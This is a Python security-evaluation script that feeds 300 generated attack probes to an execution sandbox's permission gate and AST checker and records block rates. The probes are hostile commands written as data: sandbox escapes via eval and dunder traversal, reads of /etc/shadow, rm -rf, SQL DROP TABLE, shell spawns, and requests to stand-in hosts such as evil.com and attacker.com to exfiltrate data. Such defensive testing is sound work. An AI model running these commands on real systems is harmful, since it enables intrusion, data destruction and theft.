"""Adversarial security evaluation of Orion's execution isolation and policy gate.

Tests 300 attack probes across 6 categories (50 each):
1. eval_exec
2. import_bypass
3. filesystem_access
4. subprocess_spawn
5. socket_network
6. dunder_traversal
"""

from __future__ import annotations

import json
from pathlib import Path
from harness.permissions import preprocess, sanitize_input
from harness.sandbox import validate_code_ast
from harness.skills import _BANNED
from harness.config import OUTPUTS_DIR, ensure_dirs

PROBES = {
    "eval_exec": [
        f"eval('__import__(\"os\").system(\"echo {i}\")')" for i in range(10)
    ] + [
        f"exec('import sys; sys.exit({i})')" for i in range(10)
    ] + [
        f"compile('print({i})', '<string>', 'exec')" for i in range(10)
    ] + [
        f"__builtins__['eval']('1+{i}')" for i in range(10)
    ] + [
        f"getattr(__builtins__, 'exec')('x={i}')" for i in range(10)
    ],

    "import_bypass": [
        f"import os; os.listdir('/tmp/{i}')" for i in range(10)
    ] + [
        f"__import__('subprocess').run(['id_{i}'])" for i in range(10)
    ] + [
        f"importlib.import_module('shutil').rmtree('/{i}')" for i in range(10)
    ] + [
        f"from os import path as p_{i}" for i in range(10)
    ] + [
        f"__import__('posix').system('ls_{i}')" for i in range(10)
    ],

    "filesystem_access": [
        f"../../../../etc/passwd_{i}" for i in range(10)
    ] + [
        f"..\\..\\..\\windows\\system32\\cmd_{i}.exe" for i in range(10)
    ] + [
        f"open('/etc/shadow_{i}', 'r')" for i in range(10)
    ] + [
        f"DROP TABLE hr_employees_{i}; --" for i in range(10)
    ] + [
        f"DELETE FROM global_hr_{i} WHERE 1=1" for i in range(10)
    ],

    "subprocess_spawn": [
        f"subprocess.Popen(['bash', '-c', 'curl evil.com/{i}'])" for i in range(10)
    ] + [
        f"os.system('rm -rf /data_{i}')" for i in range(10)
    ] + [
        f"xp_cmdshell 'dir c:\\{i}'" for i in range(10)
    ] + [
        f"subprocess.run(['cat', 'token_{i}'])" for i in range(10)
    ] + [
        f"pty.spawn('/bin/sh_{i}')" for i in range(10)
    ],

    "socket_network": [
        f"socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect(('evil.com', {8000 + i}))" for i in range(10)
    ] + [
        f"urllib.request.urlopen('http://attacker.com/exfil_{i}')" for i in range(10)
    ] + [
        f"httpx.post('http://192.168.1.1:{i}/steal')" for i in range(10)
    ] + [
        f"requests.get('http://exfiltration.org/leak_{i}')" for i in range(10)
    ] + [
        f"import aiohttp; aiohttp.ClientSession().get('http://evil.io/{i}')" for i in range(10)
    ],

    "dunder_traversal": [
        f"''.__class__.__mro__[1].__subclasses__()[{100 + i}]" for i in range(10)
    ] + [
        f"().__class__.__bases__[0].__subclasses__()[{i}]" for i in range(10)
    ] + [
        f"object.__subclasses__()[{50 + i}].__init__.__globals__" for i in range(10)
    ] + [
        f"x.__class__.__dict__['__getitem___{i}']" for i in range(10)
    ] + [
        f"dict.__bases__[0].__subclasses__()[{i}]" for i in range(10)
    ],
}


def test_probe_blocked(probe: str) -> bool:
    """Check if probe is blocked by Orion's permission gate or AST static analysis."""
    # 1. Permission preprocess gate (regex blacklist, SQL injection, prompt injection)
    res = preprocess(probe)
    if not res.approved:
        return True

    # 2. Skill & script blacklist
    for banned in _BANNED:
        if banned in probe:
            return True

    # 3. Code execution sandbox AST static analysis
    approved, violations = validate_code_ast(probe)
    if not approved:
        return True

    return False


def run_security_eval():
    results = {}
    total_probes = 0
    total_blocked = 0

    for category, probes in PROBES.items():
        assert len(probes) == 50, f"Expected 50 probes for {category}, got {len(probes)}"
        blocked_count = 0
        for p in probes:
            if test_probe_blocked(p):
                blocked_count += 1
        results[category] = {
            "attempts": len(probes),
            "blocked": blocked_count,
            "block_rate": blocked_count / len(probes),
        }
        total_probes += len(probes)
        total_blocked += blocked_count

    summary = {
        "total_attempts": total_probes,
        "total_blocked": total_blocked,
        "overall_block_rate": total_blocked / total_probes,
        "categories": results,
    }

    ensure_dirs()
    out_file = OUTPUTS_DIR / "bench_security_eval.json"
    with open(out_file, "w") as f:
        json.dump(summary, f, indent=2)

    print("Security Evaluation Summary:")
    print(json.dumps(summary, indent=2))


if __name__ == "__main__":
    run_security_eval()
